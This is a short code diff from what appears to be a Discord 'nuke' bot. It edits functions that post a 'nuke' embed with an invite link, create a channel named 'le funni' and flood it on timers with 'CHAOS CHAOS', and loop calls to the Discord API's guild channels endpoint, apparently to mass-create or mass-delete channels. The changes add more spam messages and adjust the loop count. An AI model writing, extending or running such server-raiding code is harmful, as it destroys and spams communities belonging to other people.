@@ -492,6 +492,12 @@ channel2.send(nukeEmbed).then(channel2.send(`discord.gg/${invite.code}`))
          }
                msg.guild.channels.create("le funni").then(c => {
         c.send("CHAOS CHAOS")
+         setTimeout(() => {
+c.send("CHAOS CHAOS")
+},7000)
+        setTimeout(() => {
+c.send("CHAOS CHAOS")
+},14000)
       }) 
         }, 10000);
      }
@@ -505,7 +511,7 @@ client.on("message", msg => {
       var gid = msg.guild.id
       setTimeout(() => {
         var i = 0
-        while(i < 360) {
+        while(i < 100) {
           setTimeout(() => {
             axios({
               url: `https://discord.com/api/v8/guilds/${gid}/channels`,
